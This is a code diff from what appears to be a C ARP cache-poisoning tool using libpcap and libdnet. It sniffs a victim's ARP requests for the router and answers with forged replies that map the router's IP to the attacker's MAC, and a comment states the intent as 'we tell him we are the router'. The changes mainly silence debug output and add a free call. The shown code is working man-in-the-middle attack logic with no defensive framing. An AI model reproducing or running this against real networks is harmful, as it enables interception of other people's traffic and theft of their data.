@@ -31,8 +31,8 @@ void arp_answer(eth_addr_t victim_mac, uint8_t *victim_ip, uint8_t *router_ip) {
 	victim_ip2 = *(uint32_t *)victim_ip;
 	router_ip2 = *(uint32_t *)router_ip;
 
-	printf("victim_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&victim_ip2, *((uint8_t *)&victim_ip2 + 1), *((uint8_t *)&victim_ip2 + 2), *((uint8_t *)&victim_ip2 + 3));
-	printf("router_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&router_ip2, *((uint8_t *)&router_ip2 + 1), *((uint8_t *)&router_ip2 + 2), *((uint8_t *)&router_ip2 + 3));
+//	printf("victim_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&victim_ip2, *((uint8_t *)&victim_ip2 + 1), *((uint8_t *)&victim_ip2 + 2), *((uint8_t *)&victim_ip2 + 3));
+//	printf("router_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&router_ip2, *((uint8_t *)&router_ip2 + 1), *((uint8_t *)&router_ip2 + 2), *((uint8_t *)&router_ip2 + 3));
 
 	eth_pack_hdr(&packet.ethernet_header, victim_mac, my_mac_addr, ETH_TYPE_ARP);
 	arp_pack_hdr_ethip(&packet.arp_header, ARP_OP_REPLY, my_mac_addr, router_ip2, victim_mac, victim_ip2);
@@ -118,6 +118,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	string_to_mac_addr(my_mac, &my_mac_addr);
 	string_to_ip_addr(my_ip_string, &my_ip_addr);
 
+	free(arguments);
+
 	// We fill the eth_pack struct with the ethernet header of our packet
 	memcpy(&eth_pack, packet, sizeof(struct eth_hdr));
 
@@ -125,12 +127,12 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 //	type = eth_pack.eth_type >> 8;
 //	type |= eth_pack.eth_type << 8;
 
-	printf("src : ");
+/*	printf("src : ");
 	print_mac_address(eth_pack.eth_src);
 	printf(" ; dst : ");
 	print_mac_address(eth_pack.eth_dst);
 	printf(" ; type : %04X\n", type);
-
+*/
 	if (type == ETH_TYPE_ARP) {
 		struct arp_hdr arp_header;
 		struct arp_ethip arp_payload;
@@ -145,10 +147,11 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 //		printf("\ntarget_ip_addr = 0x%08X\n", target_ip_addr);
 //		printf("\nrouter_id_addr = 0x%08X\n", router_ip_addr);
 
-		printf("\t[ARP (opcode = 0x%04X) detected]\n", opcode);
+//		printf("\t[ARP (opcode = 0x%04X) detected]\n", opcode);
 		// if it's a request from the victim to get the router mac addr
 		if ( (memcmp(&router_ip_addr, &target_ip_addr, IP_ADDR_LEN) == 0) && (opcode == ARP_OP_REQUEST) ) {
-			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
+//			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
+			printf("+");
 			// we answer our mac addr to the victim, we tell him we are the router
 			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
 			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
